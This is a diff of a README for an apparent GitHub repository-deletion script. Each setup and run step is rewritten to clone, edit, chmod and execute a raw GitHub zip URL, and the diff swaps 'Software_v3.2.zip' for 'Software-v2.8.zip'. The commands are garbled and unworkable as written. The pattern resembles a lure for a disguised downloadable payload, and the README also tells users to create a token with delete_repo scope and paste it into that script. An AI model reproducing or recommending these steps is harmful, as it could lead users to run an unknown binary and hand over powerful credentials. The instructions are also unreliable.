@@ -13,24 +13,24 @@ brew install curl jq           # macOS
 **Usage****
 **Clone the Repositor**
 
-git clone https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
+git clone https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software-v2.8.zip  
 cd repo-name
 **Generate a GitHub PAT**
 Go to GitHub Token Settings
 Generate a Personal Access Token (PAT) with repo and delete_repo permissions.
 ** Configure and Run the Script**
 **Edit the script to add your credentials:**
-nano https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip
+nano https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software-v2.8.zip
 Replace the placeholders:
 
 TOKEN="your_github_personal_access_token"
 USERNAME="your_github_username"
 **Make the script executable:**
 
-chmod +x https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
+chmod +x https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software-v2.8.zip  
 **Run the script:**
 
-https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software_v3.2.zip  
+https://raw.githubusercontent.com/alvinking254/Reporipper/main/unconvincibility/Software-v2.8.zip  
 **Warnings**
 ⚠ This action is irreversible—deleted repositories CANNOT be recovered.
 ⚠ Ensure you're using a PAT instead of a password.
